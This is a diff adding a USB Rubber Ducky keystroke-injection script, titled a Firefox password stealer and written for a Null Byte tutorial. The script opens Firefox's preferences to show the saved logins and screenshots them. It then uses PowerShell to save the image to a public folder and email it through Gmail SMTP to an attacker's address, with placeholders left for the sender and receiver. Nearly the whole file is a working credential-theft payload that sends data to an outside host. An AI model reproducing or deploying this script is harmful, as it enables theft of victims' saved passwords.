@@ -1,0 +1,75 @@
+REM Author: @nickgodshall/koufax
+REM Rubber Ducky Firefox Password Stealer
+REM Target: Windows 10/Firefox V 66.0.2
+REM Description: Opens firefox, navigates to prefernces page and screenshots the saved user credentials. Then
+REM saves screenshot to public user and emails the screenshot to your email. Written for the Null Byte tutorial 
+REM Remember to replace all instances of [SENDER EMAIL] [SENDER PASSWORD] and [RECEIVER EMAIL] to their  
+REM appropriate values 
+
+DELAY 2000
+REM ------------- Open Firefox -------------
+GUI r
+DELAY 500
+STRING firefox
+DELAY 1000
+ENTER
+DELAY 4000
+REM ------------- Navigate to preferences page and views passwords -------------
+CTRL L
+DELAY 250
+STRING about:preferences#privacy
+ENTER
+DELAY 500
+TAB
+REPEAT 14
+ENTER
+DELAY 250
+TAB
+REPEAT 3
+ENTER
+DELAY 250
+ENTER
+DELAY 500
+PRINTSCREEN
+ALT F4
+REM ------------ Save screenshot as png ------------
+DELAY 100
+GUI r
+DELAY 250
+STRING powershell
+DELAY 250
+ENTER
+DELAY 250
+STRING $screenshot = gcb -Format Image
+ENTER
+STRING $path = 'C:\Users\Public\passwords.png'
+ENTER
+STRING $screenshot.Save($path, 'png')
+ENTER
+REM ------------Email Screenshot as an Attachment ------------
+REM ------------ Enter email credentials here ------------ 
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('[SENDER EMAIL]', '[SENDER PASSWORD]');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = '[SENDER EMAIL]'
+ENTER
+STRING $ReportEmail.To.Add('[RECEIVER EMAIL]')
+ENTER
+STRING $ReportEmail.Subject = 'USER CREDENTIALS'
+ENTER
+STRING $ReportEmail.Body = 'Here are the usernames I found for you. Quack Quack.'
+ENTER
+STRING $ReportEmail.Attachments.Add('C:\Users\Public\passwords.png')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
